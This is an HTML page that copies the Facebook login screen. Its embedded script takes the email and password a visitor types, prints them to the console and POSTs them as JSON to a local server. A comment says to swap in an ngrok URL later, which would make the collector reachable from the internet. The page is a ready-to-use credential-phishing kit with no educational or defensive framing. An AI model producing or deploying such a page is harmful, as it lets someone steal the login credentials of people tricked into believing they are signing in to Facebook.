<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      width: 300px;
      padding: 20px;
      background-color: white;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .login-box h1 {
      color: #1877f2;
      text-align: center;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    .login-btn {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Facebook</h1>
    <input type="text" id="email" class="input-field" placeholder="Email or Phone Number">
    <input type="password" id="password" class="input-field" placeholder="Password">
    <button class="login-btn" onclick="sendInfo()">Log In</button>
  </div>

  <script>
    function sendInfo() {
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;
      console.log('Email: ' + email + ', Password: ' + password);

      // To save the information, send it to your server:
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://localhost:8000/save", true);  // Update with ngrok URL later
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({
        email: email,
        password: password
      }));
    }
  </script>
</body>
</html>
